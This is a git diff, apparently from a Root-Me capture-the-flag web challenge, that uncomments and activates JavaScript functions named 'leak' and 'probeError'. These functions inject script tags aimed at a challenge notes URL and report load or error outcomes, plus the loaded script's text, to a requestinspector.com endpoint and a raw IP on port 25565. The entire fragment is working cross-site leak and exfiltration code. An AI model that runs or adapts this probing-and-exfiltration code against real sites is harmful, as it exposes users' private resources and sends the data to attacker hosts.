@@ -26,40 +26,40 @@
               }
           });
       }
-      // const leak = async (url, id) => {
-      //     return new Promise((r) => {
-      //         let s = document.createElement('script')
-      //         s.src = url
-      //         s.onload = (e) => {
-      //             console.log('Onload event triggered at ' + url);
-      //             fetch(`https://requestinspector.com/inspect/01gyaf1q2zrdrde530pd9ma6pr/?url=${url}`)
-      //             fetch(`https://requestinspector.com/inspect/01gyaf1q2zrdrde530pd9ma6pr/?url=${s.textContent}`)
-      //             e.target.remove()
-      //             return r(0)
-      //         }
-      //         s.onerror = (e) => {
-      //             console.log('Error event triggered');
-      //             fetch(`http://91.173.39.199:25565/?error=${id}`)
-      //             e.target.remove()
-      //             return r(1)
-      //         }
-      //         document.head.appendChild(s)
-      //     })
-      // }
-      // function probeError(url, id) {
-      //     let script = document.createElement('script');
-      //     script.src = url;
-      //     script.onload = () => {
-      //         console.log('Onload event triggered at ' + url);
-      //         fetch(`https://requestinspector.com/inspect/01gyaf1q2zrdrde530pd9ma6pr/?url=${url}`)
-      //     }
-      //     script.onerror = () => {
-      //         console.log('Error event triggered');
-      //         fetch(`http://91.173.39.199:25565/?error=${id}`)
-      //     }
-      //     document.head.appendChild(script);
-      // }
-      // leak(`https://web-client-ch56.challenge01.root-me.org:58056/notes/${3202}`, 3202)
+      const leak = async (url, id) => {
+          return new Promise((r) => {
+              let s = document.createElement('script')
+              s.src = url
+              s.onload = (e) => {
+                  console.log('Onload event triggered at ' + url);
+                  fetch(`https://requestinspector.com/inspect/01gyaf1q2zrdrde530pd9ma6pr/?url=${url}`)
+                  fetch(`https://requestinspector.com/inspect/01gyaf1q2zrdrde530pd9ma6pr/?url=${s.textContent}`)
+                  e.target.remove()
+                  return r(0)
+              }
+              s.onerror = (e) => {
+                  console.log('Error event triggered');
+                  fetch(`http://91.173.39.199:25565/?error=${id}`)
+                  e.target.remove()
+                  return r(1)
+              }
+              document.head.appendChild(s)
+          })
+      }
+      function probeError(url, id) {
+          let script = document.createElement('script');
+          script.src = url;
+          script.onload = () => {
+              console.log('Onload event triggered at ' + url);
+              fetch(`https://requestinspector.com/inspect/01gyaf1q2zrdrde530pd9ma6pr/?url=${url}`)
+          }
+          script.onerror = () => {
+              console.log('Error event triggered');
+              fetch(`http://91.173.39.199:25565/?error=${id}`)
+          }
+          document.head.appendChild(script);
+      }
+      leak(`https://web-client-ch56.challenge01.root-me.org:58056/notes/${3202}`, 3202)
 
 
   </script>
